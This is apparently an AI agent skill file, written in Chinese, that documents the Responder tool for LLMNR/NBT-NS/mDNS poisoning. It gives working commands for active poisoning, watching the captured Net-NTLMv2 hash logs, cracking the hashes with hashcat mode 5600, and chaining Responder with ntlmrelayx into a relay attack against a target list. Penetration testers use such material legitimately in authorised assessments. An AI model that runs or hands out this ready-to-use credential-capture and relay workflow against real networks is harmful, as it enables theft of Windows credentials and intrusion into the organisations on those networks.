---
name: responder
description: >
  此技能适用于用户询问关于 "responder"、"捕获 NTLM 哈希"、"毒化名称解析"、"执行 NTLM 中继攻击"、"搭建流氓 SMB/HTTP 服务器进行凭据捕获"、"收集哈希用于离线破解" 等内容。NBT-NS、LLMNR 和 mDNS 毒化工具，可从局域网 Windows 主机捕获 Net-NTLMv2 哈希。
---

# Responder

LLMNR/NBT-NS/mDNS 毒化工具 —— 从局域网 Windows 主机捕获 Net-NTLMv2 哈希。

## 原理

当 Windows 主机尝试解析 DNS 无法响应的主机名时，会回退到 LLMNR/NBT-NS 广播。Responder 响应这些广播并以自身 IP 回复，导致 Windows 主机发起认证 —— Responder 从中捕获 Net-NTLMv2 哈希。

## 快速开始

```bash
# 被动启动（分析模式 —— 不进行毒化）
sudo responder -I eth0 -A

# 主动毒化（捕获哈希）
sudo responder -I eth0 -wv

# 捕获的哈希保存至：
# /usr/share/responder/logs/ 或 ~/.responder/logs/
```

## 核心参数

| 参数 | 说明 |
|------|------|
| `-I <iface>` | 网络接口 |
| `-A` | 分析模式 —— 不进行毒化 |
| `-w` | 启用 WPAD 流氓代理服务器 |
| `-d` | 启用 DHCP 毒化 |
| `-b` | 启用 Basic HTTP 认证捕获 |
| `-v` | 详细输出（显示每个请求） |
| `-f` | 指纹识别主机 |
| `--lm` | 降级认证为 LM（旧版） |
| `--disable-ess` | 禁用扩展会话安全 |
| `-r` | 启用 WINS 服务器 |
| `--no-multirelay` | 禁用中继模式 |

## 默认启用的流氓服务器

`SMB`、`HTTP`、`HTTPS`、`FTP`、`DNS`、`LDAP`、`MSSQL`、`NTLMv1`、`NTLMv2`

## 常用工作流程

```bash
# 被动捕获 —— 等待 Windows 主机广播
sudo responder -I eth0 -wv

# 实时查看捕获的哈希
tail -f /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# 破解捕获的哈希
hashcat -a 0 -m 5600 hashes.txt rockyou.txt

# 中继时禁用 SMB + HTTP（与 ntlmrelayx 并行使用）
# 编辑 /etc/responder/Responder.conf：
# SMB = Off
# HTTP = Off
sudo responder -I eth0 -wv

# 组合中继攻击：
# 终端 1：ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support

# 终端 2：Responder（SMB+HTTP 已关闭）
sudo responder -I eth0 -wv
```

## 捕获的哈希格式

```
[SMB] NTLMv2 Hash    : DOMAIN\user::DOMAIN:challenge:hash:blob
```

使用 hashcat 模式 `5600`（Net-NTLMv2）破解，或通过中继传递。

## 资源

| 文件 | 加载时机 |
|------|----------|
| `references/ntlm-relay.md` | 完整中继链：ntlmrelayx 配置、LDAP 中继、SMB 签名绕过、RBCD |
